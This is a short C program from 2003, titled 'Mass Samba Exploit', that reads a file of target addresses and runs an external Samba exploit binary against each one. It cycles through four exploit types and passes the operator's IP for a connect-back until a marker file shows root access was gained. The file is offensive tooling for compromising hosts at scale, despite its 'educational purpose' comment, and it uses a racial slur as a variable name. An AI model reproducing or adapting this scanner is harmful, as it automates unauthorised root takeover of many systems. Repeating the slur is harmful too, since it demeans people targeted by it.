/* 
 * Mass Samba Exploit by Schizoprenic
 * Xnuxer-Research (c) 2003
 * This code just for eduction purpose 
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

void usage(char *s)
{
  printf("Usage: %s <inputfile> <your_ip>\n",s);
  exit(-1);
}

int main(int argc, char **argv)
{
  printf("Mass Samba Exploit by Schizoprenic\n");
  if(argc != 3) usage(argv[0]);
  scan(argv[1], argv[2]);
  return 0;
}

int scan(char *fl, char *bind_ip)
{
  FILE *nigger,*fstat;
  char buf[512];
  char cmd[100];
  int i;
  struct stat st;
   
  if((nigger=fopen(fl,"r")) == NULL) {
    fprintf(stderr,"File %s not found!\n", fl);
    return -1;
  }

  while(fgets(buf,512,nigger) != NULL)
  {
    if(buf[strlen(buf)-1]=='\n') buf[strlen(buf)-1]=0;
    for (i=0;i<4;i++) {
       sprintf(cmd, "./smb %d %s %s", i, buf, bind_ip);
       printf("\nTrying get root %s use type %d ...\n",buf,i);
       system(cmd);
       if (stat(".ROOT", &st) != -1) {
          unlink(".ROOT");
          break; 
       }
    }    
  }
  fclose(nigger);
  printf("\nMass exploiting finished.\n");
}
